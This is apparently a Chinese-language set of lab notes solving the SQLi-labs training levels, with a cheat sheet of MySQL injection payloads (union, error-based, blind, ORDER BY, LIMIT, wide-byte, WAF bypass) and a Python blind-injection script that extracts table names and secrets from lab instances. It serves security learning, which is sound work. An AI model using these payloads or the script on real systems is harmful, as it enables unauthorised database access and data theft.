---
title: "SQLi-lab学习笔记"
slug: gkguiw
translationKey: gkguiw
date: 2020-04-05T15:22:32+08:00
source: yuque/penetration
---

> bypass
>
> [https://xz.aliyun.com/t/7767](https://xz.aliyun.com/t/7767)
>
> ODBC：[https://forum.butian.net/share/113](https://forum.butian.net/share/113)
>
> [https://www.o2oxy.cn/2772.html](https://www.o2oxy.cn/2772.html)
>
> 
>

# 常用payload
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586599797233-1453d801-5d9a-479c-876c-12f33e0854ab.png)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586403342343-7b65273a-1679-4d86-ae09-ff008cdeece7.png)



```markdown
# 测试！
LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
```



```markdown
# UNION BASED
## 列出所有数据库
union select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA

# 列出数据库test中的所有表(均可用16进制)
union select group_concat(TABLE_name) from information_schema.tables where table_schema=`test`

# 列出（数据库：test 表：admin ）中所有的字段
union select group_concat(COLUMN_NAME) from information_schema.COLUMNS where
TABLE_SCHEMA=`test` and TABLE_NAME=`admin`

UNION SELECT 1,2,group_concat( column_name,0x20)) from information_schema.columns

# valid queries
id=1' AND 1=2 union select 1,2,(select group_concat() from information_schema.schemata) -- +
id=1' AND 1=2 union select 1,2,(select group_concat() from information_schema.tables where table_schema='security')-- #
id=1' AND 1=2 union select 1,2,(select group_concat() from information_schema.columns where table_name='users') -- +

- 注意：group_concat可以不跟group by，但里面必须跟列名，而不能跟子查询
- 回显常常有长度限制


# ERROR BASED 报错注
updatexml('2',concat('~',(select current_user()),'~'),'2')-- -
extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1),'~'));-- -	
select from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x )x-- -

- concat可用concat_ws替代，也可用group_concat整合结果


# BLIND SQL injection 盲注，延时注
id = 1" and sleep(0)='1' -- -
id=1" and if(1=1, sleep(3) , 1 ) -- -
id=1 and 1=(case when (2=2) then sleep(5) else 1 end) -- #

- 盲注似乎只能用是否延时，来确定是否闭合
- case when 后面的语句需要加括号，否则不能成功


 # 基本信息
		select @@basedir
		select @@datadir
		select current_user()

		select version()
		select @@version
		select database()
		select @@database
    
# POC
extractvalue(0X20, concat(0x5c, (VERSION（)),'~'));-- -	

```

+ 报错注入，需要语法无错误才可，**该闭合的地方要闭合**，如注释符（`-- -`）
+ 得出结论，一般可以用盲注的地方也可以用`outfile|dumpfile|load_file`.
+ 盲注可分为两类：布尔盲注+基于时间的盲注。

因为没有T/F的回显，即从响应上看不出任何差异（响应包括：响应大小/状态码/页内文字），只好采用延时函数, 一般来说，延时函数可以用`sleep`  `benchmark`，不过下面的文章提到了一种新的延时方式。

> [MySQL时间盲注五种延时方法 (PWNHUB 非预期解)](https://www.cnblogs.com/-qing-/p/10894310.html)
>



## 常用脚本
[https://github.com/hi-unc1e/some_scripts](https://github.com/hi-unc1e/some_scripts)





## Handler注入


ref

+ [https://www.cnblogs.com/hello-there/p/12882991.html](https://www.cnblogs.com/hello-there/p/12882991.html)



无列名注入（ban逗号）

```markdown
union select 1,2,3 <=>
	union select * from (select 1)a join (select 2)b join (select 3)c

limit 2,1 <=>limit 1 offset 2
```

## order by 注入


```shell
order by 1,(case when (1=1) then 1 else 0 end)

# PGSQL，需要用【1/$】来改变运算的优先级
order by
	tstamp, 1/(case when (11=111) then 1 else 0 end)
```

> order by的注入点，SQL预编译会解决sql注入问题，但是有些地方是不能参数化的。比如order by后就不能参数化，挖注入的时候看准orderby、sort参数，一挖一个准。
>
> 为什么orderby不能参数化查询？[移步这里](https://www.cnblogs.com/lsdb/p/12084038.html)
>
> 
>
> 是字符串又不能加引号（否则查询会出错）
>
> 预编译（参数化）会自动加引号
>
> 
>
> 无法预编译 => 导致注入
>

order by 语句后面发生的注入，特点如下

+ 无法作运算，即`sort=2`与`sort=(3-1)`并不相同
+ 如果直接`if(1=2,1,SLEEP(2))`，sleep时间将会变成2*当前表中记录的数目，**将会对服务器造成一定的拒绝服务攻击，**建议采用子语句验证延时注入，例如`if(1=2,1,(select 1 from (select SLEEP(2))x))`
+ 特殊情况下可使用`UNION`注入，如

```basic
$query = "(select * from test order by user_id $evil);";
```

此时采用`) UNION (SELECT 1,(version()),3)-- `来注入，如下图所示。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621907884225-20d3a2cd-ef72-4b02-b107-ee75512529b4.png)



ref

+ [Mysql-Order-By-Injection-Summary](https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html)
+ [渗透经验分享之SQL注入思路拓展 - 先知社区](https://xz.aliyun.com/t/7919)







## LIMIT 后的注入
> 1、limit前未使用order by子句，可以直接用union select进行注入
>
> 2、limit前使用order by子句且mysql版本在5.0.0到5.7.18之间的，尝试使用procedure存储过程和analyse函数
>
> `PROCEDURE ANALYSE()` is deprecated as of MySQL 5.7.18, and is removed in MySQL 8.0.
>

报错注，payload如下

```sql
LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x7c,version())),rand());


# mysql> select `table_name` from information_schema.tables limit 0,1 procedure analyse(extractvalue(rand(), concat(0x7c, version(),0x7c)),rand());
ERROR 1105 (HY000): XPATH syntax error: '|5.5.44-0ubuntu0.14.04.1|'
```

如果不能报错的华，可以用延时注，但是不能用sleep()，会报错`ERROR 1105 (HY000): Only constant XPATH queries are supported`

```sql
PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
// 虽然会报错，但是的确有延时
1‘ case 为真，有延迟，延迟后报错
2‘ case 为假，马上报错
```

ref

+ [https://www.cnblogs.com/qing123/p/4575901.html](https://www.cnblogs.com/qing123/p/4575901.html)
+ [https://xz.aliyun.com/t/5858](https://xz.aliyun.com/t/5858)







## 不插入数据的注入（INSERT / UPDATE 注入）
在网鼎杯中考察了一种另类的注入方式，insert语句中在不插入数据的情况下，完成注入，使用到了pow(999,999)报错。

首先，我们看看下面的语句

```sql
# （1=1）为真，查询出错。即(QUERY)为真时，查询会出错。
mysql> select `table_name` from information_schema.tables where （1=1） and pow(999,999);
ERROR 1690 (22003): DOUBLE value is out of range in 'pow(999,999)'

# （1=0）为假，查询结果为空。即(QUERY)为假时，查询结果为空。
mysql> select `table_name` from information_schema.tables where （1=0） and pow(999,999);
Empty set (0.00 sec)


```

+ 报错 => 查询为真
+ 结果为空 => 查询为假

既然已经明确了True/False时的响应情况，你马上就可以意识到这实际就是个布尔盲注，就可以在不向数据库中插入数据的情况下，完成数据的猜解。

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592584010906-15ef6e01-2828-4435-98d9-e994ea291895.png)

**成因分析**（以下纯属个人理解）

因为`（QUERY）and pow(999,999)`是双目运算符，必须要两边都为真时才为真，一碰到假**马上就**会返回假，不会再进行后续的计算；也就是说，在这里`and`运行时会有三种状态，真(True)、假(False)、错误(Error)，我们就是利用的它后两种状态的区别，来实现盲注。

**总结**

1）. 当查询语句`QUERY`为假时，mysql不会对后面的`pow(999,999)`进行计算，直接就返回`false`;

2）. 当查询语句`QUERY`为真时，mysql会对后面的`pow(999,999)`进行计算，由于这个数太大已经溢出，当然就会报错。

**闭合符号**

```markdown
# 闭合符号
0|()-- 
0'|()-- 
0"|()-- 
0)|()-- 
0')|()-- 
0")|()-- 
0))|()-- 
0'))|()-- 
0"))|()-- 
0)))|()-- 
#####################################
# 当单引号被过滤(去掉)
0%df'|()-- 
0%df')|()-- 
0%df'))|()-- 
#####################################
# 当双引号被过滤
0%df"|()-- 
0%df")|()-- 
0%df"))|()-- 
#####################################
0'|()|''='1-- 
0"|()|''='1-- 
0)|()|''='1-- 
0')|()|''='1-- 
0")|()|''='1-- 
0))|()|''='1-- 
0'))|()|''='1-- 
0"))|()|''='1-- 
0)))|()|''='1-- 
#####################################
0'||()||''='1
```



---

# Less-65:Challenge-12
闭合符号是`")`，改exp，冲！

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594118424392-b412f696-0ba2-4e37-be09-fd9a140da722.png)

# Less-64:Challenge-11
闭合符号是`))`, 同前面两关

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594112721743-b49f3017-41f2-41ba-a551-1bfd11a8270d.png)

# Less-63:Challenge-10
闭合符号是单引号`'`

把脚本内容中的闭合符号改一改即可，美滋滋

```markdown
# less43-exp.py
# coding=utf-8
# author:unc1e
import requests
import string

# mysql> select ascii('1'), (select substring(ascii('1'),1,1)), (select substring(ascii('1'),2,1));
# +------------+------------------------------------+------------------------------------+
# | ascii('1') | (select substring(ascii('1'),1,1)) | (select substring(ascii('1'),2,1)) |
# +------------+------------------------------------+------------------------------------+
# |         49 | 4                                  | 9                                  |
# +------------+------------------------------------+------------------------------------+

def str_to_hex(s):
    '''
    :param s:
    :return: 将字符串转为0x带头的十六进制值
    '''
    return '0x'+''.join([hex(ord(c)).replace('0x', '') for c in s])

# initialize param
url = "https://sec4ever.cn/Less-63/index.php?id=0' "
reset_url ="https://sec4ever.cn/sql-connections/setup-db-challenge.php?id={}".format(url.split("sec4ever.cn")[1])   # /sql-connections/setup-db-challenge.php?id=/Less-60/index.php


TIMEOUT = 8
VERIFY = True

table_name_len = len('UX9CUK2CIC')
flag_len = len('uwpeCvsrLcadsa8P7wSn9Ix4')

charIndexSet =  ["Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1","admin2","admin3","dhakkan","admin4"]   # 字符串特征,index is from 0-9
charIndexSet_rev = charIndexSet[::-1] 
Set =  [ -3, -2, -1 ]   # 取字符串ascii值的百位+十位+个位
# 个位：substring((query),-1, 1)
# 十位：substring((query),-2, 1)；
# 百位  substring((query),-3, 1),

# 初始化
sess = requests.session()

def req2getOneChar(xurl, payload, start, end):
    '''

    :param xurl: base url
    :param payload: (select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573)
    :param start ,end: [start, end]
    :return:
    '''

    asciiValue = ['0','0','0'] # 百位，十位，个位 
    flag = ""
    for l in range(start, end+1):
        for k, kv in enumerate(Set):# 先获取
            # k = 0，1，2
            # kv = -3，-2，-1 用于substring得到ascii值的各个位上的数字
            url = xurl + "or id=" + "substring(ascii(substring(({payload}), {l}, 1)), {kv}, 1)".format(payload=payload, l=l, kv=kv ) + '-- -'
            #print(url)
            resp = sess.get(url=url, timeout=TIMEOUT, verify=VERIFY)
            for i in range(1, 10):# 遍历1~9的特征值for(1,10)
                s1 = 'Your Login name : ' + charIndexSet[i]# "Dumb"
                e1 = 'Your Password : ' + charIndexSet_rev[i]#admin4
                if( resp.text.count(s1) > 0  and resp.text.count(e1) > 0):
                    # 若页面内容中含有当前特征值，则认为当前特征值的索引是其对应位的值（0～9）
                    # 如：页面同时含有Angelina和dhakkan，该位值为1
                    asciiValue[k] = str(i) # 0是个位，1是百位和十位
                    break
                else:
                    asciiValue[k] = '0'
                    continue

        foo = int(asciiValue[0] + asciiValue[1] + asciiValue[2])# 如'4'+'9' => 49, '10'+'2'=102
        flag += chr(foo)    #chr(49)='1'
        print("[-]current content is:{}".format(flag))
    if flag != '':
        return flag
    else:
        print("[!]req2getOneChar ERROR!")


# step 1：获取表名
def getTables():
    # P79FGLN0JK
    payload = '''(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573)'''
    table_name = req2getOneChar(xurl=url, payload=payload, start=1, end=table_name_len)
    print("[-]table_name is:{}".format(table_name))
    return table_name



def getColumn():
    '''
    获取列名，
    --------------------------
内容 id,sessid,secret_Y1P6,tryy
              ↑         ↑
位置          11        21
    --------------------------
    '''
    # step 2：获取列名
    payload = '''(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name={table})'''.format(table=str_to_hex(table_name))
    column_name = req2getOneChar(xurl=url, payload=payload, start=11, end=21)

    if "secret" in column_name:
        print("[+]column_name is:{}".format(column_name))
        return column_name
    else:
        print("step2 失败！")

# 清空次数
sess.get(url=reset_url, verify=VERIFY)

# exploit
table_name = getTables()
column_name = getColumn()


# step 3 获取flag
payload = '''(select {} from {})'''.format((column_name), (table_name))
flag = req2getOneChar(xurl=url, payload=payload, start=1, end=flag_len)
print("[+]FLAG is:{}".format(flag))
```



# Less-62:Challenge-9
boolean injection, close char is `')`, via `/Less-62/?id=1') and 1=2 -- -`and`/Less-62/?id=1') and 1=1 -- -`

参考脚本[https://github.com/hi-unc1e/some_scripts/blob/master/boolean_sqli_exp.py](https://github.com/hi-unc1e/some_scripts/blob/master/boolean_sqli_exp.py)

```markdown

```

运行效果如图, 舒服

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594111563293-dccec4bc-b117-4c14-af8b-ab095114a2ea.png)

# Less-61:Challenge-8
close_chars is `'))` , can be mounted via  `/Less-61/?id=1')) and 1=2 -- -`

so adjust my exploit script, get the flag...

```markdown
[+]table_name is:UX9CUK2CIC
[+]column_name is:secret_9BN9
[+]flag is:l55fc3v4TvJZk7GAspprtOAh	
```



# exp
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1593922201970-9c162cca-f873-4380-8399-faa205c778f2.png)

```markdown
$ /root/TODO/sqli-lab/blind-sqli/venv/error_based_exp.py
[+]table_name is:OTTEP9Q92I
[+]column_name is:secret_GRH1
[+]flag is:mcnTThCOxqzeD2ok8CJgKjfn
```

# Less-60:Challenge-7
闭合符号是`")`

```markdown
# /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -
XPATH syntax error: '|3BYH4G78SZ|'

# /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x3342594834473738535a),0x7c))%20 -- -
 XPATH syntax error: '|id,sessid,secret_Y1P6,tryy|' 
 
# /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select secret_Y1P6 from 3BYH4G78SZ),0x7c))%20 -- -
XPATH syntax error: '|uwpeCvsrLcadsa8P7wSn9Ix4|'
```

# Less-59:Challenge-6
> Less than 5 attempts
>

报错注入，整数型注入点，无须加闭合符号

```markdown
# /Less-59/index.php?id=1 and extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -
 XPATH syntax error: '|MDAMM2TQC0|' 
 
# /Less-59/index.php?id=1|| extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x4d44414d4d3254514330),0x7c))%20 -- -
 XPATH syntax error: '|id,sessid,secret_8OOF,tryy|' 

# /Less-59/index.php?id=1 ||extractvalue(rand(),concat(0x7c,(select secret_8OOF from MDAMM2TQC0),0x7c))%20 -- -
 XPATH syntax error: '|CoyCW2IfA9AcJ0hkK2qLNC9v|' 
```



# Less-58:Challenge-5
报错注入，加单引号可闭合

```markdown
# poc
/Less-58/index.php?id=2' or extractvalue(rand(),concat(0x7c,(version()),0x7c) )-- -
```

```markdown
# /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -
 XPATH syntax error: '|BOE8SLA8JQ|' 
 
# /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x424f4538534c41384a51),0x7c))%20 -- - 
 XPATH syntax error: '|id,sessid,secret_FQB6,tryy|' 
 
# /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select secret_FQB6 from BOE8SLA8JQ),0x7c))%20 -- -
 XPATH syntax error: '|B0vjwa55UVF1zg6dk82s5YB7|' 
```



# Less-57:Challenge-4
闭合符号是`"`

```markdown
# /Less-57/index.php?id=0" union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -
Your Password:ABM2UNYI3Q 

# /Less-57/index.php?id=0" union select 11,22,group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573%20 and table_name=0x41424d32554e59493351-- -
Your Password:id,sessid,secret_6DIE,tryy 

# /Less-57/index.php?id=0" union select 11,22,group_concat(secret_6DIE) from ABM2UNYI3Q-- -
Your Password:tZu9ubeDFgkGhooKCpNZcxwI 
```



# Less-56:Challenge-3
> 14次之内出结果
>

闭合符号是`')`

```markdown
# /Less-56/index.php?id=0') union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -
Your Password:EBO6LSIRQE 

# /Less-56/index.php?id=0') union select 11,22,group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573%20 and table_name=0x45424f364c5349525145-- -
Your Password:id,sessid,secret_4UZO,tryy 

# /Less-56/index.php?id=0') union select 11,22,group_concat(secret_4UZO) from EBO6LSIRQE-- -
Your Password:8amWDI2U8nxTFu6BqEDF7WlM 
```





# Less-55:Challenge-2
> 要求14次之内出结果
>

由`/Less-55/?id=2-1`知是整数型的注入点

```markdown
# 

# /Less-55/index.php?id=0) union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -
Your Password:Q5X3TPYWK7 

# /Less-55/index.php?id=0) union select 11,22,group_concat(column_name) from information_schema.columns where table_name=0x59414e52364d46534453 and table_schema=0x6368616c6c656e676573 -- -
Your Password:id,sessid,secret_IIJI,tryy

# /Less-55/index.php?id=0) union select 11,22,secret_IIJI from Q5X3TPYWK7 -- -
Your Password:yTWvRRHETnXIo38rWajAOFb4 
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1593697751110-7b819b16-056e-4f55-ac7e-539b3631c15e.png)

# Less-54:Challenge-1
> The objective of this challenge is to dump the **(secret key)** from only random table from Database _**('CHALLENGES')**_ in Less than 10 attempts
>
> For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.
>

这关的目标，是从一个叫`CHALLENGES`的数据库中找到flag，只有10次请求的机会，十次之后必须重置——表名、列名都会因此发生变化（随机值）。

联合注入

```markdown
# poc
/Less-54/?id=0' union select 11,22,33 -- -
```

```markdown
//列出数据库名
#

//列出表名
# /Less-54/index.php?id=0' union select 11,22,group_concat(TABLE_name) from information_schema.tables%20 where table_schema=0x6368616c6c656e676573-- -
Your Password:N9K0T2B5HK

//列名
# /Less-54/index.php?id=0' union select 11,22,group_concat(column_name) from information_schema.columns%20 
	where table_schema=0x6368616c6c656e676573 
  and table_name=0x4e394b3054324235484b-- -
Your Password:id,sessid,secret_ZRYE,tryy 

//flag
# /Less-54/index.php?id=0' union select 11,22,secret_ZRYE from%20 N9K0T2B5HK-- -
Your Password:zbEMB0vRz6OS2aawzyvIiT5l


```

过关！

中间还复习了以下information_schema表的结构

reference

+ [https://blog.csdn.net/qq_37133717/article/details/93498444](https://blog.csdn.net/qq_37133717/article/details/93498444)

# Less-53 - ORDER BY Clause Blind based
闭合符号是单引号，无错误回显，那么就直接上盲注的payload

```markdown
# poc
/Less-53/?sort=1',if(1=1,id,username)-- -
```

# Less-52 - ORDER BY Clause Blind based
无需闭合，直接上盲注的payload，`case when then else end`和`if`都可以，只是我个人比较喜欢`if`

```markdown
# /Less-52/?sort=if(left(version(),2)='5',username ,exp(999))
【false】 页面无结果回显

# /Less-52/?sort=if(left(version(),1)='5',username ,exp(999))
【true】 页面有回显
```

根据页面回显的不同，就可以一位一位地跑出数据

# Less-51 - ORDER BY Clause Blind based
跟上一关类似，只是前后需要闭合：前面需要单引号闭合，后面可以用注释也可以双目符+单引号闭合（如`and '`)

报错注入

```markdown
# /Less-51/?sort=2',extractvalue(rand(),concat(0x7c,version(),0x7c)) -- -
 XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|' 
```

盲注是一样的

```markdown
/Less-51/?sort=0',if(left(version(),1)='5', username,id) -- -
```

# Less-50 - ORDER BY Clause Blind based
无需闭合符号且有报错，可以由`/Less-50/?sort=2,0`和`/Less-50/?sort=2,1`回显不同来确定有注入点

通过报错注入拿到信息

```markdown
/Less-50/?sort=2,extractvalue(rand(),concat(0x7c,version(),0x7c))
```

布尔盲注

```markdown
# poc
/Less-50/?sort=if(1=1, username,id)
/Less-50/?sort=if(1=2, username,id)

# exp
/Less-50/?sort=if(left(version(),1)='5', username,id)
...
```



# Less-49 - ORDER BY Clause Blind based
order by 要跑盲注，不但要检查是否需单引号来闭合语句，还需要记得**加逗号**！

```markdown
# poc
/Less-49/?sort=',USERNAME -- -
/Less-49/?sort=1',IF(1=1,`username`,0) -- -

## 下面两种顺序不同
/Less-49/?sort=1',IF(length(version())>119,`username`,0) -- -
/Less-49/?sort=1',IF(length(version())>9,`username`,0) -- -

# exp
/Less-49/?sort=1',IF(length(version())=23,`username`,0) -- -
/Less-49/?sort=1',IF(left(version(),1)='5',`username`,0) -- -
/Less-49/?sort=1',IF(left(version(),2)='5.',`username`,0) -- -
...
/Less-49/?sort=1',IF(left(version(),23)='5.7.30-0ubuntu0.18.04.1',`username`,0) -- -
```

# Less-48 - ORDER BY Clause Blind based
布尔盲注poc

```markdown
# /Less-48/?sort=1,0
无回显

# /Less-48/?sort=1,1
有回显
```

EXP使用`case when [query] then [1] else [2] end` 或者`IF([query], [1], [2])`均可

+ 注意`[1] [2]`位置**不能填数字**，带上反引号也不行。只能填字符串，如`test`

```markdown
# exp跑数据
## /Less-48/?sort=if(length(version())>99,username,1)
 顺序为8 9 10
 
## /Less-48/?sort=if(length(version())>1,username,1)
 顺序为1-9的增序
```

利用`[query]`语句为真/假时的响应顺序不同，就能一位一位跑出数据

# Less-47 - ORDER BY Clause-Error-Single quote
`order by 1`与`order by '1'`是不同的，也就是不能用单引号。但反引号```是可以的（不区分大小写）

加单引号报错，想必闭合符号就是单引号，用双目运算符来闭合

```markdown
# /Less-47/?sort=' and extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ||'
 XPATH syntax error: '||5.7.30-0ubuntu0.18.04.1||'	
```

# Less-46 - ORDER BY-Error-Numeric
order by 后面的注入，特点如下

+ 无法作运算，即`sort=2`与`sort=(3-1)`不同
+ 如果直接`if(1=2,1,SLEEP(2))`，sleep时间将会变成2*当前表中记录的数目，**将会对服务器造成一定的拒绝服务攻击，**建议采用子语句验证延时注入，例如`if(1=2,1,(select 1 from (select SLEEP(2))x))`

```markdown
# poc
## 以下结果不同
	rand(1=2)
	rand(1=1)
```

访问`/Less-46/?sort=1,0`发现蹊跷，加单引号发现回显中有错误信息

用`/Less-46/?sort=3-- -`确定注入点是数字型，不需要另外加闭合符号

**报错注入**

```markdown
# /Less-46/?sort=extractvalue(rand(),concat(0x7c,version(),0x7c))--+-
XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'
```

**盲注**

```markdown
# boolean injection poc


# delay injection poc
/Less-46/?sort=select 1 from (select sleep(5))x-- -
```

# Less-45 - Stacked Query Blind based twist
布尔盲注，根据页面会显信息的不同来跑数据

```markdown
# poc 
## login_user=admin&login_password=adm') or 11=11 -- -&mysubmit=Login
	【true】状态码是302，跳转到主页
  
## login_user=admin&login_password=adm') or 11=00 -- -&mysubmit=Login
	【false】状态码是200，且含有slap1.jpg，即源码中有<img src="../images/slap1.jpg">
```



# Less-44 - Stacked Query blind
页面无报错信息，只有两种状态回显，poc如下

```markdown
# true
// 因为是万能密码，为true
## login_user=admin&login_password=a'+or+1=1--+-&mysubmit=Login
【true】页面302跳转

## login_user=admin&login_password=a'+or+1=0--+-&mysubmit=Login
【false】状态码200
```



# Less-43 - Stacked Query
单引号报错，且注释符被ban了

依然采用报错注入

```markdown
login_password=1'+||+extractvalue(0x20,concat(0x7c,version(),0x7c))+or'
```

# Less-42 - Stacked Query error based
登录失败会提示`bug off hacker`，真是祖安程序员呢

报错注入

```markdown
login_password=1' and extractvalue(0x20,concat(0x7c,version(),0x7c)) -- -
```

堆叠注入

略。不想构造exp了...

盲注（布尔 + 延时）

```markdown
# poc
login_password=2'+order+by+3--+-;

# exp
login_password=0'+union select 1,2,3 from (select sleep(1))x;--+-

```

# Less-41 **stacked Query Intiger type blind**
闭合`/Less-41/?id=1  -- -`

```markdown
# union based
/Less-41/?id=0 union select 1,2,3

# blind 
/Less-41/?id=1 ^ 5

  ## POC:null
  /Less-41/?id=1 and if(1=1,0,1)

  ## POC:true
  /Less-41/?id=1 and if(1=1,1,1)
```

# Less-40 **stacked Query String type Blind**
用`/Less-40/?id=1') -- -`确定闭合符号为`')`

无回显的布尔盲注

UNION BASED，联合注入阿又给忘了。。

```markdown
# POC 
/Less-40/?id=0') union ALL select 1,22,('33
	或者
/Less-40/?id=0') union select 1,22,3 -- -

# sqlmap poc
id=-7067') UNION ALL SELECT NULL,CONCAT(0x7178627671,0x6b7375687a726b446c4746706e6b4f585273466b7655614d51667851434e7a55666e5671615a794d,0x71626a7671),NULL-- -

```

# Less-39 **stacked Query Intiger type**
报错注

```markdown
/Less-39/?id=1 and extractvalue(0x20,concat(0x7c,version(),0x7c))-- -
```

Union base injection

```markdown
/Less-39/?id=0 union select 11,22,33
```

delay injection(boolean)

```markdown
/Less-39/?id=0 union select 1,2,1 from (select sleep(5))x;
```

# Less-38 **stacked Query**
堆叠注入

报错注

```markdown
/Less-38/?id=1' and extractvalue(rand(),concat(0x7c,version(),0x7c))-- -
```

联合注

```markdown
/Less-38/?id=0' union select 1,group_concat(username),group_concat(password) from users -- -
```

插入用户

```markdown
/Less-38/?id=1;insert into users(username,password) values('stack', 'stack')%23
```

# Less-37- MySQL_real_escape_string
同样的报错注入，只不过是在`POST`请求里面

```markdown
POST 
...

uname=admin+%df%27or+%27%27%3D%27&passwd=111&submit=Submit
```

# Less-36 **Bypass MySQL Real Escape String**
宽字节，`%df%27`即可当单引号使用

```markdown
# 报错注入
/Less-36/?id=1%df%27%20and%20extractvalue(rand(),concat(0x7c,version(),0x7c))--%20-
```

# Less-35 **why care for addslashes()**
整数型注入点

盲注

```markdown
# /Less-35/?id=1 and 1=1
有结果

# /Less-35/?id=1 and 1=2
无结果
```

联合注入

```markdown
# /Less-35/?id=1 order by 3-- -
有结果

# /Less-35/?id=1 order by 4-- -
 Unknown column '4' in 'order clause' 

```

报错注入

```markdown
/Less-35/?id=1 and extractvalue(rand(),concat(0x7c,version(),0x7c))
```

# Less-34- Bypass Add SLASHES
fuzz大法好，burp的`battering ram`, payload选`brute forcer`的`0123456789`，就是`00-99`

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1593017382227-985b4647-cc96-45e1-9531-16ce92ae90e6.png)

最后得出可用的值，此处以`%99`为例（`%df`也可）

```markdown
# POST poc
## uname=admin%99%27and+extractvalue(rand(),concat(0x7c,version(),0x7c))--+-&passwd=admin%99%27&submit=Submit
	XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'

```

实际上，fuzz可以从00一直到ff

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1593017824176-21af679a-2032-4dd3-9905-63fffa028fa0.png)

# Less-33 不知何种原因，靶场环境和32一样
略过

# Less-32 **Bypass addslashes()**
宽字节注入, 用`%df`吞以下`addslashes()`加上的反斜杠`\`，即可报错注入

```markdown
/Less-32/?id=1%df' and extractvalue(0x20,concat(0x7c,version(),0x7c))-- -
```

当然，只要能够逃逸出单引号，就可以盲注

```markdown
# 盲注poc
/Less-32/?id=1%df'and 1=0 -- -
```

同时，有回显的情况下，UNION注入也可

```markdown
# order by 定列数
## /Less-32/?id=1%df%27%20order%20by%204%20--%20-
 Unknown column '4' in 'order clause' 
 
## /Less-32/?id=1%df%27%20order%20by%204%20--%20-
 Your Login name:Dumb
Your Password:Dumb 
```

[https://sec4ever.cn/Less-18/](https://sec4ever.cn/Less-18/)

# Less-31 FUN with WAF
加双引号报错，注释`-- -`未过滤

```markdown
猜列名
# /Less-31/?id=1") order by 3-- -
(正常结果)

# /Less-31/?id=1") order by 4 -- -
（报错）
Unknown column '4' in 'order clause'
```

只是闭合符号跟上关不同，这里的闭合符号是`")`，最终采用联合注入+group_concat的方式，一次性取出所有数据。

```markdown
/Less-31/?id=0")%20 unIOn seLEct 1,group_concat(username),group_concat(password) from users -- -
```

报错注入也是可以的，此处就不贴出`payload`了

# Less-30
这关也是waf，结果引号、`order by`、`union select `、注释均可使用，这个waf属实捞

```markdown
# poc
/Less-30/?id=0" unIOn seLEct 1,2,3 -- -

# union based sqli
/Less-30/?id=0" unIOn seLEct 1,group_concat(username),group_concat(password) from users -- -
```



# Less-29 Protection with WAF
说好的waf呢？

——既没有过滤引号，也没有过滤`and` `or`

报错注入，直接冲了

```markdown
 # /Less-29/?id=0' or extractvalue(0x20,concat(0x7c,version(),0x7c))-- -
   XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|' 
```

UNION联合注

```markdown
# 表名
/Less-29/?id=0' union select 1,group_concat(table_name,0x20) ,group_concat(table_schema,0x20) from information_schema.tables where '1

# 数据
/Less-29/?id=0' union select 1,group_concat(username,0x20) ,group_concat(password,0x20) from users where '1
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592746584181-b75630ad-ba36-4716-a8fe-2cd7e17d5b60.png)



# Less-28a Trick with SELECT & UNION
```markdown
#  闭合
/Less-28a/?id=1') -- -

# 列数
/Less-28a/?id=1')%20 order by 4 -- -

# 出数据
/Less-28a/?id=0')  Union SELEct 1,2,3 -- -
```

# Less-28 Trick with SELECT & UNION
找闭合符号的时候出了一些问题：`/Less-28/?id=0'`无结果, 发现过滤空格和注释

应该想到闭合符号是`')`，用逻辑或来闭合`1')||('`

空格用`%09`和`%a0`来绕过，因为过滤union+select的正则表达式是`preg_replace('/union\s+select/i',"", $id);`

```markdown
